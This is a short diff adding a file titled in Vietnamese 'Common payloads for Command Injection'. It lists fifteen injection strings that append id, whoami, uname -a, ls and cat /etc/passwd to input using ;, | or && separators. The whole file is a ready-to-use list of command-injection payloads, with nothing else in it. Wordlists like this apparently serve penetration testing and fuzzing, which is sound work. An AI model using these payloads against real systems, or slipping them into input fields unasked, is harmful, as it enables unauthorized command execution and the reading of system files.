@@ -1,0 +1,16 @@
+# Payloads phổ biến cho Command Injection
+;id
+|id
+&&id
+| whoami
+; whoami
+&& whoami
+| cat /etc/passwd
+; cat /etc/passwd
+&& cat /etc/passwd
+| uname -a
+; uname -a
+&& uname -a
+| ls
+; ls
+&& ls
